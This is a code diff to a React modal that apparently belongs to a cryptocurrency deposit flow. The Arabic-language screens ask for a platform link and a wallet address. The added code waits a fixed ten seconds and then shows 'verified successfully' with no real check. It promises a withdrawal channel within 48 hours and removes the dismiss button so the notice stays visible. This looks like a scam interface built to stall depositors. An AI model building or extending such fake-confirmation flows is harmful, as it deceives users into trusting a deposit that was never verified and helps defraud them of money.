@@ -1,5 +1,5 @@
 
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 
 interface ModalProps {
   onClose: () => void;
@@ -9,6 +9,16 @@ const Modal: React.FC<ModalProps> = ({ onClose }) => {
   const [step, setStep] = useState(1);
   const [platformLink, setPlatformLink] = useState('');
   const [walletAddress, setWalletAddress] = useState('');
+
+  // Handle the 10-second delay for Step 5
+  useEffect(() => {
+    if (step === 5) {
+      const timer = setTimeout(() => {
+        setStep(6);
+      }, 10000); // 10 seconds
+      return () => clearTimeout(timer);
+    }
+  }, [step]);
 
   const nextStep = () => setStep((prev) => prev + 1);
 
@@ -108,6 +118,25 @@ const Modal: React.FC<ModalProps> = ({ onClose }) => {
             <p className="text-gray-500 mt-2">جاري التأكد من عملية الإيداع، قد يستغرق هذا بضع دقائق.</p>
           </div>
         );
+      case 6:
+        return (
+          <div className="flex flex-col items-center text-center py-6" dir="rtl">
+            <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mb-6 shadow-lg animate-bounce">
+              <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path>
+              </svg>
+            </div>
+            <h2 className="text-xl font-bold text-green-600 mb-4">تم التأكد بنجاح</h2>
+            <div className="bg-gray-50 p-5 rounded-2xl border border-gray-100 mb-2">
+              <p className="text-gray-700 text-[15px] leading-relaxed font-medium">
+                سيتم فتح قناة السحب خلال 48 ساعة. 
+                <br />
+                <span className="text-[#8a2230] block mt-2">قم بالرجوع كل ساعة للتأكد، ستختفي هذه الرسالة عند فتح قناة السحب.</span>
+              </p>
+            </div>
+            {/* The "حسناً" button has been removed to keep the notification visible */}
+          </div>
+        );
       default:
         return null;
     }
@@ -115,7 +144,7 @@ const Modal: React.FC<ModalProps> = ({ onClose }) => {
 
   return (
     <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
-      {/* Overlay with reduced blur effect to 2px */}
+      {/* Overlay with 2px blur */}
       <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px]"></div>
       
       {/* Modal Container */}
